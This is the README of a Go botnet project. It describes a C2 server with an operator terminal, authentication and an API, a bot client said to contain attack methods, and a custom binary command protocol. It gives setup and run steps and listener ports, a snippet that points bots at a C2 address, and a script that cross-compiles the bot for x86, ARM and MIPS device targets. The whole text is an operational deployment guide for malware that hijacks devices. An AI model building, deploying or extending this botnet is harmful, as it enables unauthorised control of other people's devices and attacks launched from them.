# Go Botnet Project - Setup Guide

## 1. Overview

This is a C2 (Command & Control) system with a bot client, written in Go. The C2 provides a terminal UI for managing bots, launching tasks, and monitoring connected devices. Communication is encrypted over TLS with a custom binary protocol.

### Structure

```
├── cnc/                 # C2 server source
│   ├── cfg.go           # constants (ports, paths, limits)
│   ├── types.go         # shared types
│   ├── main.go          # entry point, listeners, signal handling
│   ├── tui.go           # terminal UI, commands, animations
│   ├── auth.go          # login, bcrypt, quotas, connection limits
│   ├── token.go         # JWT sessions, refresh, revocation
│   ├── acl.go           # RBAC permissions
│   ├── bots.go          # bot registry, heartbeat, diagnostics
│   ├── wire.go          # binary packet protocol (19-byte header)
│   ├── api.go           # REST API over HTTPS
│   ├── pool.go          # TLS connection pool
│   ├── store.go         # bounded thread-safe maps/slices
│   ├── throttle.go      # rate limiting
│   ├── log.go           # logging
│   ├── check.go         # input validation
│   └── data/
│       ├── certs/       # server.crt, server.key
│       ├── geo/         # GeoIP .mmdb files
│       ├── gifs/        # .tfx animation files
│       ├── json/        # rbac.json, users.json
│       └── logs/        # runtime logs
│
├── device/              # bot client source
│   ├── bot.go           # bot logic + attack methods
│   └── build.sh         # cross-compile script
│
├── gifs/                # source .gif files
├── gif.py               # GIF → TFX converter
└── .gitignore
```

---

## 2. C2 Server

### Prerequisites

- Go 1.21+

### Setup

1. Generate or place TLS certs in `cnc/data/certs/` (`server.crt`, `server.key`)
2. Edit `cnc/data/json/users.json` to set up initial user accounts
3. Edit `cnc/data/json/rbac.json` for role permissions
4. Optionally place MaxMind `.mmdb` files in `cnc/data/geo/`

### Build & Run

```bash
cd cnc
go build -o c2 .
./c2
```

Or build and run in one step:

```bash
cd cnc
go run .
```

The server starts three listeners:
- **Port 420** — operator terminal (TLS)
- **Port 7002** — bot connections (TLS)
- **Port 8443** — REST API (HTTPS)

---

## 3. Bot Client

### Setup

Edit `device/bot.go` and change the C2 address in `main()`:

```go
func main() {
    b := newBot(randID(16), "YOUR_C2_IP:7002")
    b.run()
}
```

### Build

Single platform:

```bash
cd device
go build -o bot .
./bot
```

Cross-compile for multiple Linux targets:

```bash
cd device
chmod +x build.sh
./build.sh
# outputs in build/ directory: x86, armv7l, armv5l, armv8l, mips, mipsel
```

---

## 4. Protocol

Custom binary protocol over TLS.

- **Header:** 19 bytes (type `uint8`, length `uint32`, timestamp `int64`, padding, checksum `uint16`)
- **Payload:** variable length, max 16 KB
- **Checksum:** SHA-256 of header bytes + payload, truncated to 2 bytes

Packet types:
| Type | Value | Direction |
|:---|:---|:---|
| Ping | `0x01` | Both |
| Pong | `0x02` | Both |
| Command | `0x03` | C2 → Bot |
| Diagnostic | `0x04` | Bot → C2 |
| Heartbeat | `0x05` | Bot → C2 |
| Auth | `0x06` | Bot → C2 |
| AuthResp | `0x07` | C2 → Bot |

---

## 5. GIF → TFX Converter

Converts GIF files to a terminal-renderable `.tfx` format using half-block characters.

### Requirements

```bash
pip install Pillow numpy
```

### Usage

```bash
python gif.py <input.gif> <output.tfx> [--width 80] [--height 24]
```

Example:

```bash
python gif.py gifs/crow.gif cnc/data/gifs/crow.tfx
python gif.py gifs/logo.gif cnc/data/gifs/logo.tfx --width 120 --height 30
```
